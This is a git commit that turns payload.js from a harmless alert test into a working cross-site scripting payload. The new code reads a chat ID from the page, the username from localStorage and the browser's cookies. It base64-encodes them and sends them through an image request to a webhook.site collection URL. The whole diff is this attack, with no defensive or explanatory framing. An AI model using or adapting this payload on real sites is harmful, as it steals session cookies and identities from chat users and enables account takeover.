506becb3febc6056a1c22ec8251a07bf46bd3a2a
K1NG5P4RR0W <koguifrejus@gmail.com>
2025-05-07 18:24:20 +0100

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,1 +1,7 @@
-alert("Payload exécuté !");
+(function(){
+  const chatId = document.getElementById('chat-config')?.dataset?.chatId || 'unknown';
+  const user = localStorage.getItem('username') || 'anon';
+  const payload = btoa(`chatId=${chatId}&user=${user}&cookie=${document.cookie}`);
+  const img = new Image();
+  img.src = `https://webhook.site/a952eb63-9ea4-4de7-8361-be7ea6b39233/?data=${payload}`;
+})();
